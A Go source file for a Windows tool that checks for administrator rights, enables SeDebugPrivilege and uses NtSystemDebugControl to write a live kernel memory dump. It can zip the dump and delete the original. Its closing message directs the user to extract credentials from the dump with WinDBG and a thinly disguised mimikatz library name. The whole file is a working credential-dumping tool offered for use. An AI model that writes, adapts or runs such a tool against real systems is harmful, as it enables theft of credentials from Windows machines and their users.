package main

import (
	"archive/zip"
	"flag"
	"fmt"
	"io"
	"os"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

const SystemDebugControl = 37

var (
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	ntSystemDebugControl = ntdll.NewProc("NtSystemDebugControl")
	createFile           = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateFileW")
)

type SYSDBG_LIVEDUMP_CONTROL struct {
	Version       uint32
	BugCheckCode  uint32
	BugCheckParam [4]uint64
	FileHandle    windows.Handle
	CancelHandle  windows.Handle
	Flags         uint32
	Pages         uint32
}

func isAdmin() bool {
	var tokenHandle windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tokenHandle)
	if err != nil {
		return false
	}
	defer tokenHandle.Close()

	var elevation uint32
	var size uint32
	err = windows.GetTokenInformation(tokenHandle, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &size)
	if err != nil {
		return false
	}

	return elevation != 0
}

func enableSeDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeDebugPrivilege: %v", err)
	}

	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	return windows.AdjustTokenPrivileges(token, false, &privileges, uint32(unsafe.Sizeof(privileges)), nil, nil)
}

func createDumpFile(filePath string) (windows.Handle, error) {
	utf16Path, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return 0, err
	}

	handle, _, err := createFile.Call(
		uintptr(unsafe.Pointer(utf16Path)),
		windows.GENERIC_WRITE,
		0,
		0,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("failed to create dump file: %v", err)
	}
	return windows.Handle(handle), nil
}

func dumpKernelMemory(outputFile string) error {
	fileHandle, err := createDumpFile(outputFile)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(fileHandle)

	dumpControl := SYSDBG_LIVEDUMP_CONTROL{
		Version:      1,
		FileHandle:   fileHandle,
		BugCheckCode: 0x161,
		BugCheckParam: [4]uint64{0, 0, 0, 0},
		Flags:        4,
		Pages:        0,
	}
	fmt.Println("[+] Start of kernel memory dump...")

	status, _, _ := ntSystemDebugControl.Call(
		uintptr(SystemDebugControl),
		uintptr(unsafe.Pointer(&dumpControl)),
		uintptr(unsafe.Sizeof(dumpControl)),
		0,
		0,
		0,
	)

	if status != 0 {
		return fmt.Errorf("NtSystemDebugControl failed with status: 0x%x", status)
	}

	fmt.Println("[+] Kernel memory dump completed successfully!")

	fileInfo, err := os.Stat(outputFile)
	if err == nil {
		fileSizeMB := fileInfo.Size() / (1024 * 1024)
		fmt.Printf("[+] File size = %d MB\n", fileSizeMB)
	} else {
		fmt.Println("[!] Could not determine file size:", err)
	}

	return nil
}

func compressFile(filePath string) error {
	fmt.Println("[+] Start compression part...")
	zipFileName := filePath + ".zip"
	zipFile, err := os.Create(zipFileName)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	srcFile, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	writer, err := zipWriter.Create(filePath)
	if err != nil {
		return err
	}

	_, err = io.Copy(writer, srcFile)
	if err != nil {
		return err
	}

	fmt.Println("[+] Compression successful: ", zipFileName)
	srcFile.Close()
	
	// Delete the original file after successful compression
	if err := os.Remove(filePath); err != nil {
		fmt.Println("[!] Failed to delete original file:", err)
	} else {
		fmt.Println("[+] Original file deleted successfully")
	}

	return nil
}

func main() {
	fmt.Println("[+] Written by @k4nfr3")

	compressFlag := flag.Bool("compress", false, "Compress the output file into a zip archive")
	flag.Parse()
	if flag.NArg() < 1 {
		fmt.Println("Usage: program <output_file> [--compress]")
		return
	}
	if *compressFlag {
		fmt.Println("[+] --compress option enabled")

	}
	if !isAdmin() {
		fmt.Println("[!] Error: This program must be run as Administrator.")
		return
	}
	fmt.Println("[+] Check passed, you are running as privileged user")
	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Println("Warning: Failed to enable SeDebugPrivilege -", err)
	} else {
		fmt.Println("[+] SeDebugPrivilege enabled successfully")
	}
	outputFile := flag.Arg(0)

	err := dumpKernelMemory(outputFile)
	if err != nil {
		fmt.Println("[!] Error:", err)
	} else {
		fmt.Println("[+] Kernel dump saved to:", outputFile)
	}

	if *compressFlag {
		err := compressFile(outputFile)
		if err != nil {
			fmt.Println("[!] Compression failed:", err)
		}
	}
	fmt.Println("[+] Now use WinDBG and m1m1l1b.dll to extract credentials")
}
